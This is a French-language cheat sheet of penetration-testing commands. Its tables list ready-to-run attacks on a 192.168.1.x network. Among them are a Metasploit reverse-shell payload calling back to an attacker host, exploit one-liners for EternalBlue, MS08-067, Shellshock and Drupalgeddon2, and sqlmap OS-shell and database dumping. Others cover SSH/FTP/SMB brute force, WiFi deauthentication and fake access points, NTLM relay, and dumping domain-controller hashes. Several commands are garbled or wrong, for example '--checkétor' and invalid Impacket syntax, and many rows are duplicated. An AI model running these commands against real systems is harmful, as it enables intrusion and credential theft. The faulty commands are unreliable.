# Guide des Commandes de Test de Pénétration
*Préparé par Mohammed AlSubayt*

## Table des Matières
- [Commandes Nmap](#commandes-nmap)
- [Commandes Metasploit](#commandes-metasploit)
- [Commandes Nikto](#commandes-nikto)
- [Commandes Sqlmap](#commandes-sqlmap)
- [Commandes Hydra](#commandes-hydra)
- [Commandes John the Ripper](#commandes-john-the-ripper)
- [Commandes Aircrack-ng](#commandes-aircrack-ng)
- [Commandes Wireshark et Tshark](#commandes-wireshark-et-tshark)
- [Autres Commandes](#autres-commandes)

## Commandes Nmap

| No. | Commande | Explication |
|-----|----------|-------------|
| 1 | nmap -sP 192.168.1.0/24 | Scanner le réseau pour découvrir les périphériques actifs. |
| 2 | nmap -sS 192.168.1.1 | Effectuer un scan TCP SYN pour détecter les ports ouverts sur l'appareil. |
| 3 | nmap -sV 192.168.1.1 | Détecter les versions des services fonctionnant sur les ports ouverts. |
| 4 | nmap -O 192.168.1.1 | Déterminer le système d'exploitation utilisé sur l'appareil. |
| 5 | nmap -A 192.168.1.1 | Scan complet incluant les ports ouverts, les versions des services et la détection du système d'exploitation. |
| 6 | nmap -Pn 192.168.1.1 | Scanner les appareils même s'ils ne répondent pas aux requêtes Ping. |
| 7 | nmap -sU 192.168.1.1 | Scanner les ports UDP ouverts. |
| 8 | nmap -p- 192.168.1.1 | Scanner tous les ports (1-65535) au lieu des ports par défaut. |
| 9 | nmap --script vuln 192.168.1.1 | Utiliser des scripts pour vérifier les vulnérabilités. |
| 10 | nmap --script smb-enum-shares -p 445 192.168.1.1 | Énumérer les partages SMB en utilisant un script Nmap. |
| 11 | nmap --script http-enum -p 80 192.168.1.1 | Énumérer les répertoires du serveur web en utilisant un script Nmap. |
| 12 | nmap --script smb-vuln-ms17-010 192.168.1.1 | Vérifier la vulnérabilité MS17-010 (EternalBlue). |
| 13 | nmap --script smb-vuln-cve-2017-7494 192.168.1.1 | Vérifier la vulnérabilité CVE-2017-7494 (SambaCry). |
| 14 | nmap --script smb-vuln-ms08-067 192.168.1.1 | Vérifier la vulnérabilité MS08-067. |
| 15 | nmap --script smb-vuln-ms10-061 192.168.1.1 | Vérifier la vulnérabilité MS10-061 (Print Spooler). |
| 16 | nmap --script smb-vuln-regsvc-dos 192.168.1.1 | Vérifier la vulnérabilité DoS du service de registre. |
| 17 | nmap --script http-sql-injection --scriptargs='http-sql-injection.args' -p 80 192.168.1.1 | Vérifier les vulnérabilités d'injection SQL en utilisant un script Nmap. |
| 18 | nmap -sL 192.168.1.0/24 | Lister toutes les adresses IP du sous-réseau sans les scanner. |
| 19 | nmap -p80 --script http-methods 192.168.1.1 | Découvrir les méthodes HTTP autorisées sur un serveur web. |
| 20 | nmap -p80 --script http-title 192.168.1.1 | Récupérer le titre de la page web. |
| 21 | nmap -p80 --script http-headers 192.168.1.1 | Récupérer les en-têtes HTTP du serveur. |
| 22 | nmap -p80 --script http-enum 192.168.1.1 | Énumérer les applications web courantes sur le serveur. |
| 23 | nmap -p80 --script http-auth 192.168.1.1 | Tester les méthodes d'authentification HTTP. |
| 24 | nmap -sX 192.168.1.1 | Scan Xmas pour détecter les ports ouverts. |
| 25 | nmap -sA 192.168.1.1 | Scan ACK pour cartographier les règles de pare-feu. |
| 26 | nmap -sW 192.168.1.1 | Scan Window pour détecter les ports ouverts en fonction de la taille de la fenêtre TCP. |
| 27 | nmap -sM 192.168.1.1 | Scan Maimon pour détecter les ports ouverts en utilisant une combinaison de drapeaux FIN/ACK. |
| 28 | nmap -p80 --script http-userdir-enum 192.168.1.1 | Énumérer les répertoires utilisateur sur un serveur web. |
| 29 | nmap -p80 --script http-passwd 192.168.1.1 | Vérifier le fichier /etc/passwd sur le serveur web. |
| 30 | nmap -p80 --script http-robots.txt 192.168.1.1 | Récupérer et analyser le fichier robots.txt. |
| 31 | nmap --script ssh-brute -p 22 192.168.1.1 | Attaque par force brute sur le login SSH en utilisant un script Nmap. |
| 32 | nmap --script ftp-anon 192.168.1.1 | Vérifier la connexion FTP anonyme. |
| 33 | nmap --script ftp-vsftpd-backdoor 192.168.1.1 | Vérifier la vulnérabilité de backdoor vsftpd. |
| 34 | nmap --script http-sql-injection --scriptargs='http-sql-injection.args' -p 80 192.168.1.1 | Vérifier les vulnérabilités d'injection SQL en utilisant un script Nmap. |
| 35 | nmap --script http-phpself-xss 192.168.1.1 | Vérifier les vulnérabilités XSS de PHP_SELF. |
| 36 | nmap --script dns-brute 192.168.1.1 | Effectuer une énumération DNS par force brute. |
| 37 | nmap -p 22 --script ssh-hostkey 192.168.1.1 | Récupérer les clés d'hôte SSH. |
| 38 | nmap -p 53 --script dns-recursion 192.168.1.1 | Vérifier la récursion DNS. |
| 39 | nmap --traceroute 192.168.1.1 | Effectuer un traceroute avec le scan. |
| 40 | nmap -sn 192.168.1.0/24 | Scan ping pour découvrir les hôtes actifs sans scanner les ports. |

## Commandes Metasploit

| No. | Commande | Explication |
|-----|----------|-------------|
| 1 | metasploit | Lancer le framework Metasploit pour le développement et l'exécution d'exploits. |
| 2 | msfconsole | Ouvrir l'interface console de Metasploit. |
| 3 | msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.2 LPORT=4444 -f exe > shell.exe | Générer une charge utile (payload) Metasploit. |
| 4 | msfconsole -r script.rc | Exécuter des commandes Metasploit à partir d'un fichier script. |
| 5 | msfconsole -x "use exploit/windows/smb/ms17_010_eternalblue; set RHOST 192.168.1.1; exploit" | Exploiter la vulnérabilité EternalBlue. |
| 6 | msfconsole -x "use exploit/multi/handler; set PAYLOAD windows/meterpreter/reverse_tcp; set LHOST 192.168.1.2; set LPORT 4444; exploit" | Configurer et exécuter un gestionnaire multi pour les charges utiles TCP inversées. |
| 7 | msfconsole -x "use exploit/windows/smb/psexec; set RHOST 192.168.1.1; set SMBUser user; set SMBPass pass; exploit" | Exploiter SMB avec psexec. |
| 8 | msfconsole -x "use auxiliary/scanner/portscan/tcp; set RHOSTS 192.168.1.0/24; set THREADS 10; run" | Scan de port TCP en utilisant Metasploit. |
| 9 | msfconsole -x "use auxiliary/scanner/http/http_version; set RHOSTS 192.168.1.0/24; run" | Scanner les versions HTTP sur un réseau. |
| 10 | msfconsole -x "use auxiliary/scanner/ftp/ftp_login; set RHOSTS 192.168.1.0/24; set USER_FILE /path/to/users.txt; set PASS_FILE /path/to/passwords.txt; run" | Attaque par force brute sur login FTP. |
| 11 | msfconsole -x "use auxiliary/scanner/ssh/ssh_login; set RHOSTS 192.168.1.0/24; set USER_FILE /path/to/users.txt; set PASS_FILE /path/to/passwords.txt; run" | Attaque par force brute sur login SSH. |
| 12 | msfconsole -x "use auxiliary/scanner/smb/smb_version; set RHOSTS 192.168.1.0/24; run" | Scanner les versions SMB sur un réseau. |
| 13 | msfconsole -x "use auxiliary/scanner/smb/smb_enumshares; set RHOSTS 192.168.1.0/24; run" | Énumérer les partages SMB sur un réseau. |
| 14 | msfconsole -x "use auxiliary/scanner/smb/smb_enumusers; set RHOSTS 192.168.1.0/24; run" | Énumérer les utilisateurs SMB sur un réseau. |
| 15 | msfconsole -x "use auxiliary/scanner/rdp/rdp_scanner; set RHOSTS 192.168.1.0/24; run" | Scanner les services RDP sur un réseau. |
| 16 | msfconsole -x "use exploit/windows/smb/ms08_067_netapi; set RHOST 192.168.1.1; exploit" | Exploiter la vulnérabilité MS08-067. |
| 17 | msfconsole -x "use exploit/unix/ftp/vsftpd_234_backdoor; set RHOST 192.168.1.1; exploit" | Exploiter la backdoor vsftpd 2.3.4. |
| 18 | msfconsole -x "use exploit/windows/dcerpc/ms03_026_dcom; set RHOST 192.168.1.1; exploit" | Exploiter la vulnérabilité MS03-026. |
| 19 | msfconsole -x "use exploit/windows/smb/psexec; set RHOST 192.168.1.1; set SMBUser user; set SMBPass pass; exploit" | Exécuter des commandes sur Windows via SMB et psexec. |
| 20 | msfconsole -x "use exploit/linux/http/apache_mod_cgi_bash_env_exec; set RHOST 192.168.1.1; exploit" | Exploiter la vulnérabilité Shellshock. |
| 21 | msfconsole -x "use exploit/windows/smb/ms17_010_eternalblue; set RHOST 192.168.1.1; exploit" | Exploiter la vulnérabilité EternalBlue. |
| 22 | msfconsole -x "use exploit/multi/http/struts2_content_type_ognl; set RHOST 192.168.1.1; exploit" | Exploiter l'injection Struts2 Content-Type OGNL. |
| 23 | msfconsole -x "use exploit/unix/webapp/drupal_drupalgeddon2; set RHOST 192.168.1.1; exploit" | Exploiter la vulnérabilité Drupalgeddon2. |
| 24 | msfconsole -x "use exploit/multi/php/php_cgi_arg_injection; set RHOST 192.168.1.1; exploit" | Exploiter l'injection d'argument PHP CGI. |
| 25 | msfconsole -x "use exploit/windows/browser/ms14_064_ole_code_execution; set RHOST 192.168.1.1; exploit" | Exploiter l'exécution de code MS14-064 OLE. |

## Commandes Nikto

| No. | Commande | Explication |
|-----|----------|-------------|
| 1 | nikto -h http://192.168.1.1 | Scanner les serveurs web pour détecter les vulnérabilités. |
| 2 | nikto -h http://192.168.1.1 -Plugins | Exécuter des plugins spécifiques pour un scan détaillé. |
| 3 | nikto -h http://192.168.1.1 -C all | Scan complet du serveur web avec tous les tests. |
| 4 | nikto -h http://192.168.1.1 -Tuning 1 | Ajuster le scan pour ne vérifier que les fichiers intéressants. |
| 5 | nikto -h http://192.168.1.1 -Format msf+ | Exporter les vulnérabilités vers Metasploit. |
| 6 | nikto -h http://192.168.1.1 -Plugins robots | Vérifier les vulnérabilités de robots.txt. |
| 7 | nikto -h http://192.168.1.1 -Plugins fileupload | Vérifier les vulnérabilités de téléchargement de fichiers. |
| 8 | nikto -h http://192.168.1.1 -Plugins shellshock | Vérifier la vulnérabilité Shellshock. |
| 9 | nikto -h http://192.168.1.1 -Plugins heartbleed | Vérifier la vulnérabilité Heartbleed. |
| 10 | nikto -h http://192.168.1.1 -Plugins poodle | Vérifier la vulnérabilité POODLE. |
| 11 | nikto -h http://192.168.1.1 -output report.html | Générer un rapport de vulnérabilité pour un serveur web. |
| 12 | nikto -h http://192.168.1.1 -Plugins cgi | Vérifier les vulnérabilités CGI. |
| 13 | nikto -h http://192.168.1.1 -Plugins apache | Vérifier les vulnérabilités spécifiques à Apache. |
| 14 | nikto -h http://192.168.1.1 -Plugins iis | Vérifier les vulnérabilités spécifiques à IIS. |
| 15 | nikto -h http://192.168.1.1 -Plugins horde | Vérifier les vulnérabilités spécifiques à Horde. |
| 16 | nikto -h http://192.168.1.1 -Plugins nessus | Vérifier la compatibilité Nessus. |
| 17 | nikto -h http://192.168.1.1 -Plugins php | Vérifier les vulnérabilités spécifiques à PHP. |
| 18 | nikto -h http://192.168.1.1 -Plugins ssl | Vérifier les vulnérabilités spécifiques à SSL/TLS. |
| 19 | nikto -h http://192.168.1.1 -Plugins generic | Exécuter des tests génériques pour les vulnérabilités courantes. |
| 20 | nikto -h http://192.168.1.1 -Plugins msf | Vérifier l'intégration Metasploit. |
| 21 | nikto -h http://192.168.1.1 -Plugins tomcat | Vérifier les vulnérabilités spécifiques à Tomcat. |

## Commandes Sqlmap

| No. | Commande | Explication |
|-----|----------|-------------|
| 1 | sqlmap -u "http://192.168.1.1/vuln.php?id=1" --dbs | Détecter et exploiter les vulnérabilités d'injection SQL. |
| 2 | sqlmap -u "http://192.168.1.1/vuln.php?id=1" --dump | Extraire le contenu de la base de données après avoir trouvé une injection SQL. |
| 3 | sqlmap -u "http://192.168.1.1/vuln.php?id=1" --os-shell | Obtenir un shell OS à travers une injection SQL. |
| 4 | sqlmap -u "http://192.168.1.1/vuln.php?id=1" --tamper=space2comment | Contourner le WAF en utilisant des scripts de falsification. |
| 5 | sqlmap -u "http://192.168.1.1/vuln.php?id=1" --hex | Utiliser l'encodage hexadécimal pour les charges utiles. |
| 6 | sqlmap -u "http://192.168.1.1/vuln.php?id=1" --dbms=mysql | Spécifier le SGBD pour utiliser des charges utiles spécifiques. |
| 7 | sqlmap -u "http://192.168.1.1/vuln.php?id=1" --privileges | Récupérer les privilèges de l'utilisateur SGBD. |
| 8 | sqlmap -u "http://192.168.1.1/vuln.php?id=1" --level=5 --risk=3 | Test avancé d'injection SQL avec un niveau de risque et un niveau élevés. |
| 9 | sqlmap -u "http://192.168.1.1/vuln.php?id=1" --passwords | Récupérer les hachages de mots de passe SGBD. |
| 10 | sqlmap -u "http://192.168.1.1/vuln.php?id=1" --roles | Récupérer les rôles SGBD. |
| 11 | sqlmap -u "http://192.168.1.1/vuln.php?id=1" --schema | Récupérer le schéma SGBD. |
| 12 | sqlmap -u "http://192.168.1.1/vuln.php?id=1" --count | Compter le nombre d'entrées dans les tables. |
| 13 | sqlmap -u "http://192.168.1.1/vuln.php?id=1" --search -T users --string="admin" | Rechercher des chaînes spécifiques dans la base de données. |
| 14 | sqlmap -u "http://192.168.1.1/vuln.php?id=1" --batch | Exécuter SQLmap en mode non interactif. |
| 15 | sqlmap -u "http://192.168.1.1/vuln.php?id=1" --delay=5 | Ajouter un délai entre chaque requête. |
| 16 | sqlmap -u "http://192.168.1.1/vuln.php?id=1" --timeout=10 | Définir un délai d'expiration pour chaque requête. |
| 17 | sqlmap -u "http://192.168.1.1/vuln.php?id=1" --retries=3 | Définir le nombre de tentatives pour chaque requête. |
| 18 | sqlmap -u "http://192.168.1.1/vuln.php?id=1" --tor | Utiliser le réseau Tor pour l'anonymat. |
| 19 | sqlmap -u "http://192.168.1.1/vuln.php?id=1" --checkétor | Vérifier si le réseau Tor est utilisé correctement. |
| 20 | sqlmap -u "http://192.168.1.1/vuln.php?id=1" --proxy=http://127.0.0.1:8080 | Utiliser un proxy pour les requêtes. |

## Commandes Hydra

| No. | Commande | Explication |
|-----|----------|-------------|
| 1 | hydra -l admin -P /path/to/passwords.txt 192.168.1.1 ssh | Attaque par force brute sur le login SSH en utilisant une liste de mots de passe. |
| 2 | hydra -l admin -P /path/to/passwords.txt -s 2222 ssh://192.168.1.1 | Attaque par force brute sur SSH sur un port non standard. |
| 3 | hydra -l admin -P /path/to/passwords.txt http-get://192.168.1.1 | Attaque par force brute sur l'authentification HTTP GET. |
| 4 | hydra -l admin -P /path/to/passwords.txt http-post-form://192.168.1.1/login.php | Attaque par force brute sur le formulaire de login HTTP POST. |
| 5 | hydra -L users.txt -P passwords.txt 192.168.1.1 ssh | Attaque par force brute sur SSH avec plusieurs noms d'utilisateurs. |
| 6 | hydra -L users.txt -P passwords.txt smb://192.168.1.1 | Attaque par force brute sur l'authentification SMB. |
| 7 | hydra -l admin -P /path/to/passwords.txt ftp://192.168.1.1 | Attaque par force brute sur le login FTP. |
| 8 | hydra -l admin -P /path/to/passwords.txt 192.168.1.1 ssh | Attaque par force brute sur le login SSH en utilisant Hydra. |
| 9 | hydra -l admin -P /path/to/passwords.txt http-get://192.168.1.1/login.php | Attaque par force brute sur le formulaire de login HTTP GET. |
| 10 | hydra -l admin -P /path/to/passwords.txt http-post-form://192.168.1.1/login.php | Attaque par force brute sur le formulaire de login HTTP POST. |
| 11 | hydra -l admin -P /path/to/passwords.txt -e nsr 192.168.1.1 ssh | Attaque par force brute sur SSH avec des devinettes de mot de passe null/simple/inverse. |
| 12 | hydra -l admin -P /path/to/passwords.txt -t 4 192.168.1.1 ssh | Définir le nombre de connexions parallèles à 4 pour l'attaque par force brute SSH. |
| 13 | hydra -L users.txt -P passwords.txt http-get://192.168.1.1 | Attaque par force brute sur le login HTTP GET avec plusieurs noms d'utilisateurs. |
| 14 | hydra -L users.txt -P passwords.txt http-post-form://192.168.1.1/login.php | Attaque par force brute sur le login HTTP POST avec plusieurs noms d'utilisateurs. |
| 15 | hydra -l admin -P /path/to/passwords.txt -f 192.168.1.1 ssh | Arrêter après avoir trouvé le premier mot de passe pour SSH. |
| 16 | hydra -l admin -P /path/to/passwords.txt -s 21 192.168.1.1 ftp | Attaque par force brute sur le login FTP sur le port 21. |
| 17 | hydra -L users.txt -P passwords.txt -o results.txt 192.168.1.1 ssh | Enregistrer les résultats dans un fichier. |
| 18 | hydra -l admin -P /path/to/passwords.txt -V 192.168.1.1 ssh | Mode verbeux pour afficher chaque tentative. |
| 19 | hydra -l admin -P /path/to/passwords.txt -M targets.txt ssh | Attaque par force brute sur SSH sur plusieurs cibles listées dans un fichier. |
| 20 | hydra -l admin -P /path/to/passwords.txt -R | Restaurer une session précédente. |
| 21 | hydra -l admin -P /path/to/passwords.txt -e nsr 192.168.1.1 ssh | Attaque par force brute sur SSH avec des devinettes de mot de passe null/simple/inverse. |
| 22 | hydra -l admin -P /path/to/passwords.txt -t 4 192.168.1.1 ssh | Définir le nombre de connexions parallèles à 4 pour l'attaque par force brute SSH. |
| 23 | hydra -L users.txt -P passwords.txt http-get://192.168.1.1 | Attaque par force brute sur le login HTTP GET avec plusieurs noms d'utilisateurs. |
| 24 | hydra -L users.txt -P passwords.txt http-post-form://192.168.1.1/login.php | Attaque par force brute sur le login HTTP POST avec plusieurs noms d'utilisateurs. |
| 25 | hydra -l admin -P /path/to/passwords.txt -f 192.168.1.1 ssh | Arrêter après avoir trouvé le premier mot de passe pour SSH. |
| 26 | hydra -l admin -P /path/to/passwords.txt -s 21 192.168.1.1 ftp | Attaque par force brute sur le login FTP sur le port 21. |
| 27 | hydra -L users.txt -P passwords.txt -o results.txt 192.168.1.1 ssh | Enregistrer les résultats dans un fichier. |
| 28 | hydra -l admin -P /path/to/passwords.txt -V 192.168.1.1 ssh | Mode verbeux pour afficher chaque tentative. |
| 29 | hydra -l admin -P /path/to/passwords.txt -M targets.txt ssh | Attaque par force brute sur SSH sur plusieurs cibles listées dans un fichier. |
| 30 | hydra -l admin -P /path/to/passwords.txt -R | Restaurer une session précédente. |

## Commandes John the Ripper

| No. | Commande | Explication |
|-----|----------|-------------|
| 1 | john /path/to/hashfile | Cracker les hachages de mots de passe en utilisant John the Ripper. |
| 2 | john --wordlist=/path/to/wordlist /path/to/hashfile | Crackage de mot de passe en utilisant une liste de mots. |
| 3 | john --format=NT /path/to/hashfile | Cracker les hachages de mots de passe NTLM. |
| 4 | john --rules --wordlist=/path/to/wordlist /path/to/hashfile | Utiliser une liste de mots et appliquer des règles pour le crackage de mots de passe. |
| 5 | john --show /path/to/hashfile | Afficher les mots de passe crackés à partir du fichier de hachage. |
| 6 | john --format=raw-md5 /path/to/hashfile | Cracker les hachages de mots de passe MD5 bruts. |
| 7 | john --incremental /path/to/hashfile | Utiliser le mode incrémental pour le crackage de mots de passe. |
| 8 | john --single /path/to/hashfile | Utiliser le mode de crackage unique pour le crackage de mots de passe. |
| 9 | john --wordlist=/path/to/wordlist --rules /path/to/hashfile | Utiliser une liste de mots avec des règles pour le crackage de mots de passe. |
| 10 | john --session=custom_session /path/to/hashfile | Enregistrer la session de crackage avec un nom personnalisé. |
| 11 | john --restore=custom_session | Restaurer une session de crackage enregistrée. |
| 12 | john --status=custom_session | Afficher l'état d'une session de crackage. |
| 13 | john --pot=/path/to/potfile /path/to/hashfile | Spécifier un fichier pot personnalisé pour les mots de passe crackés. |
| 14 | john --nolog /path/to/hashfile | Désactiver la journalisation. |

## Commandes Aircrack-ng

| No. | Commande | Explication |
|-----|----------|-------------|
| 1 | aircrack-ng -a2 -b [BSSID] -w /path/to/wordlist.cap | Cracker les mots de passe WPA/WPA2-PSK. |
| 2 | aircrack-ng -e SSID -w /path/to/wordlist /path/to/capture.cap | Cracker la poignée de main WPA avec un SSID spécifique. |
| 3 | airodump-ng wlan0 | Capturer des paquets et afficher les réseaux sans fil. |
| 4 | aireplay-ng -0 10 -a [BSSID] wlan0 | Désauthentifier les clients pour capturer des poignées de main. |
| 5 | airodump-ng -c 6 --bssid [BSSID] -w capture wlan0 | Capturer des paquets sur un canal spécifique et BSSID. |
| 6 | aircrack-ng -z /path/to/capture.cap | Utiliser l'attaque PTW contre WEP. |
| 7 | aircrack-ng -k 1 /path/to/capture.cap | Utiliser l'attaque KoreK contre WEP. |
| 8 | airodump-ng --band abg wlan0 | Capturer des paquets sur toutes les bandes sans fil (a, b, g). |
| 9 | aireplay-ng -3 -b [BSSID] wlan0 | Effectuer une attaque par relecture ARP pour générer du trafic. |
| 10 | aireplay-ng -9 wlan0 | Effectuer un test d'injection pour vérifier si la carte prend en charge l'injection. |
| 11 | aireplay-ng -1 0 -e [SSID] -a [BSSID] -h [MAC] wlan0 | Attaque d'authentification falsifiée pour s'associer avec le point d'accès. |
| 12 | aireplay-ng -2 -r /path/to/arp-request wlan0 | Attaque par relecture de paquets interactive. |
| 13 | airodump-ng --write /path/to/output wlan0 | Écrire les paquets capturés dans un fichier. |
| 14 | airbase-ng -e "Free WiFi" -c 6 wlan0 | Créer un faux point d'accès. |
| 15 | airdecap-ng -e [SSID] /path/to/capture.cap | Déchiffrer les paquets WEP/WPA avec une clé connue. |

## Commandes Wireshark et Tshark

| No. | Commande | Explication |
|-----|----------|-------------|
| 1 | wireshark | Analyseur de protocole réseau pour la capture et l'analyse graphique de paquets. |
| 2 | tshark -i eth0 | Version en ligne de commande de Wireshark. |
| 3 | tcpdump -i eth0 | Capturer le trafic réseau sur l'interface eth0. |
| 4 | tcpdump -i eth0 port 80 | Capturer le trafic réseau sur le port 80. |
| 5 | tcpdump -i eth0 -w capture.pcap | Capturer le trafic réseau et enregistrer dans un fichier. |
| 6 | tshark -r capture.pcap | Lire et analyser un fichier pcap. |

## Autres Commandes

| No. | Commande | Explication |
|-----|----------|-------------|
| 1 | burpsuite | Lancer Burp Suite pour les tests de sécurité d'applications web. |
| 2 | zaproxy | Lancer OWASP ZAP pour les tests de sécurité d'applications web. |
| 3 | dirb http://192.168.1.1 /path/to/wordlist | Force brute de répertoires pour découvrir des fichiers et répertoires cachés. |
| 4 | gobuster dir -u http://192.168.1.1 -w /path/to/wordlist | Force brute de répertoires en utilisant Gobuster. |
| 5 | wfuzz -c -z file,/path/to/wordlist -u http://192.168.1.1/FUZZ | Outil de fuzzing pour les tests d'applications web. |
| 6 | ffuf -w /path/to/wordlist -u http://192.168.1.1/FUZZ | Fuzzeur web rapide pour découvrir des fichiers et répertoires cachés. |
| 7 | hping3 -S -p 80 -c 1 192.168.1.1 | Envoyer un seul paquet SYN pour tester si le port 80 est ouvert. |
| 8 | dnsenum example.com | Énumération DNS pour recueillir des informations sur un domaine. |
| 9 | theHarvester -d example.com -l 500 -b google | Recueillir des emails, sous-domaines et autres informations à partir des moteurs de recherche. |
| 10 | maltego | Application de renseignement open-source (OSINT) et de forensique. |
| 11 | recon-ng | Framework de reconnaissance web pour la collecte OSINT. |
| 12 | crackmapexec smb 192.168.1.1 -u user -p password --shares | Énumérer les partages SMB avec des identifiants. |
| 13 | crackmapexec smb 192.168.1.1 -u user -p password --exec 'cmd.exe /c whoami' | Exécuter des commandes sur la cible via SMB. |
| 14 | responder -I eth0 | Outil d'empoisonnement réseau pour capturer les hachages SMB/NTLM. |
| 15 | ntlmrelayx.py -smb2support -i | Relayer les hachages NTLM capturés vers le service SMB. |
| 16 | smbrelayx.py -h 192.168.1.1 -c "whoami" | Relayer les hachages NTLM pour exécuter des commandes sur la cible. |
| 17 | responder -I eth0 -w | Exécuter Responder en mode d'analyse complète. |
| 18 | hashcat -a 0 -m 0 /path/to/hashfile /path/to/wordlist | Crackage de mot de passe haute performance. |
| 19 | hashcat -a 3 -m 0 /path/to/hashfile ?a?a?a?a?a?a | Attaque par masque avec force brute pour les mots de passe de longueur 6. |
| 20 | hashcat -a 3 -m 1000 /path/to/hashfile ?l?l?l?l | Attaque par masque avec lettres minuscules pour les hachages NTLM. |
| 21 | hashcat -a 0 -m 1800 /path/to/hashfile /path/to/wordlist | Attaque par dictionnaire sur les hachages SHA-512. |
| 22 | hashcat -a 1 -m 0 /path/to/hashfile /path/to/wordlist /path/to/rules | Attaque combinatoire utilisant deux listes de mots. |
| 23 | hashcat -a 6 -m 0 /path/to/hashfile /path/to/wordlist ?d?d | Attaque hybride avec dictionnaire et suffixe à 2 chiffres. |
| 24 | hcxdumptool -i wlan0 -o capture.pcapng --enable_status=1 | Capturer des poignées de main et PMKID pour le crackage WPA. |
| 25 | hcxtools -m /path/to/pmkid /path/to/capture.pcapng | Extraire PMKID du fichier de capture. |
| 26 | reaver -i wlan0 -b [BSSID] -vv | Effectuer une attaque par force brute sur le PIN WPS. |
| 27 | wifite | Outil d'attaque sans fil automatisé pour cracker WEP/WPA/WPA2. |
| 28 | legion | Framework de test de pénétration réseau automatisé. |
| 29 | patator | Brute-forceur multi-usage et énumérateur. |
| 30 | medusa -h 192.168.1.1 -u admin -P /path/to/passwords.txt -M ssh | Attaque par force brute sur le login SSH en utilisant Medusa. |
| 31 | bloodhound-python -d example.com -u user -p password -c all | Outil d'énumération Active Directory. |
| 32 | impacket-getTGT user -dc-ip 192.168.1.1 | Obtenir un TGT Kerberos en utilisant Impacket. |
| 33 | impacket-secretsdump -just-dc-ntlm 192.168.1.1 | Extraire les hachages NTLM d'un contrôleur de domaine. |
| 34 | impacket-psexec -target 192.168.1.1 -u user -p password | Exécution de commande à distance via SMB. |
| 35 | impacket-wmiexec -target 192.168.1.1 -u user -p password | Exécution de commande à distance via WMI. |
| 36 | impacket-smbexec -target 192.168.1.1 -u user -p password | Exécution de commande à distance via SMB. |
| 37 | sslscan 192.168.1.1 | Scanner SSL/TLS pour détecter les protocoles et chiffrements supportés. |
| 38 | sslyze --regular 192.168.1.1 | Scanner de configuration SSL/TLS. |
| 39 | openssl s_client -connect 192.168.1.1:443 | Tester la connexion SSL/TLS à un serveur. |
| 40 | testssl.sh 192.168.1.1 | Tester la sécurité SSL/TLS sur un serveur. |
| 41 | curl -I http://192.168.1.1 | Récupérer les en-têtes HTTP pour recueillir des informations sur le serveur. |
| 42 | curl -X POST -d "username=admin&password=1234" http://192.168.1.1/login.php | Envoyer une requête HTTP POST au formulaire de connexion. |
| 43 | curl -O http://192.168.1.1/file.txt | Télécharger un fichier depuis un serveur web. |
| 44 | curl -H "User-Agent: Mozilla/5.0" http://192.168.1.1 | Envoyer une requête avec un en-tête User-Agent personnalisé. |
| 45 | curl -k https://192.168.1.1 | Ignorer les erreurs de certificat SSL. |
| 46 | dirb http://192.168.1.1 /path/to/wordlist | Force brute de répertoires pour découvrir des fichiers et répertoires cachés. |
| 47 | gobuster dir -u http://192.168.1.1 -w /path/to/wordlist | Force brute de répertoires en utilisant Gobuster. |
| 48 | wfuzz -c -z file,/path/to/wordlist -u http://192.168.1.1/FUZZ | Outil de fuzzing pour découvrir des fichiers ou répertoires cachés. |
| 49 | ffuf -w /path/to/wordlist -u http://192.168.1.1/FUZZ | Fuzzeur web rapide pour découvrir des fichiers et répertoires cachés. |
| 50 | wfuzz -c -z file,/path/to/wordlist -b "cookie=SESSIONID" -u http://192.168.1.1/FUZZ | Fuzzer des URLs avec des cookies de session. |
| 51 | zap-baseline.py -t http://192.168.1.1 | Scan automatisé utilisant le scan de base OWASP ZAP. |
| 52 | droopescan scan drupal -u http://192.168.1.1 | Scanner le CMS Drupal pour les vulnérabilités. |
| 53 | joomscan --url http://192.168.1.1 | Scanner le CMS Joomla pour les vulnérabilités. |
| 54 | wpscan --url http://192.168.1.1 --enumerate u | Énumérer les utilisateurs WordPress. |
| 55 | wpscan --url http://192.168.1.1 --plugins-detection mixed | Détecter les plugins WordPress. |
| 56 | searchsploit | Rechercher du code d'exploit en utilisant Exploit-DB. |
| 57 | searchsploit -m 12345 | Mirroring d'un exploit vers le répertoire courant. |
| 58 | ike-scan 192.168.1.1 | Scanner et identifier les serveurs VPN IKE. |
| 59 | yersinia | Outil d'attaque réseau pour les protocoles de couche 2. |
| 60 | mitmf | Framework d'homme-du-milieu pour les attaques réseau. |
| 61 | setoolkit | Toolkit d'ingénierie sociale pour le phishing et autres attaques. |
| 62 | beef | Framework d'exploitation de navigateur pour les attaques côté client. |
| 63 | netcat -nv 192.168.1.1 80 | Simple connexion TCP pour tester un port spécifique. |
| 64 | netcat -lvp 4444 | Écouter les connexions entrantes sur le port 4444. |
| 65 | netcat -zv 192.168.1.1 1-65535 | Scanner tous les ports en utilisant Netcat. |
| 66 | smbclient -L //192.168.1.1 -U username | Lister les partages SMB sur un serveur distant. |
| 67 | smbmap -H 192.168.1.1 -u username -p password | Énumérer les partages SMB et les permissions. |
| 68 | impacket-smbclient //192.168.1.1/share -user username | Client SMB du toolkit Impacket. |
| 69 | ldapsearch -h 192.168.1.1 -x -b "dc=example,dc=com" | Énumération LDAP. |
| 70 | cewl http://192.168.1.1 -w wordlist.txt | Générer une liste de mots personnalisée à partir d'un site web. |
| 71 | wfuzz -c -z file,/path/to/wordlist -u http://192.168.1.1/FUZZ | Fuzzer des URLs pour les fichiers et répertoires cachés. |
| 72 | dnsenum example.com | Outil d'énumération DNS pour trouver des sous-domaines. |
| 73 | dnsrecon -d example.com -t brt -D /path/to/wordlist.txt | Force brute de sous-domaines DNS. |
| 74 | dnsenum --enum example.com | Énumération DNS complète. |
| 75 | dnsmap example.com | Outil de cartographie DNS et de découverte de sous-domaines. |
| 76 | masscan -p1-65535 192.168.1.1 | Scanner de port rapide pour les grands réseaux. |
| 77 | zmap -p 80 192.168.1.0/24 | Scanner réseau rapide axé sur la vitesse. |
| 78 | recon-ng | Framework de reconnaissance web pour la collecte d'informations. |
| 79 | fping -a -g 192.168.1.0/24 | Balayage ping pour découvrir les hôtes actifs. |
| 80 | hping3 -1 192.168.1.1 | Envoyer une requête d'écho ICMP pour tester la connectivité. |
| 81 | hping3 -S 192.168.1.1 -p 80 | Envoyer un paquet TCP SYN pour tester si le port 80 est ouvert. |
| 82 | hping3 -A 192.168.1.1 -p 80 | Envoyer un paquet TCP ACK pour tester si le port 80 est ouvert. |
| 83 | hping3 -2 192.168.1.1 -p 53 | Envoyer un paquet UDP pour tester si le port 53 est ouvert. |
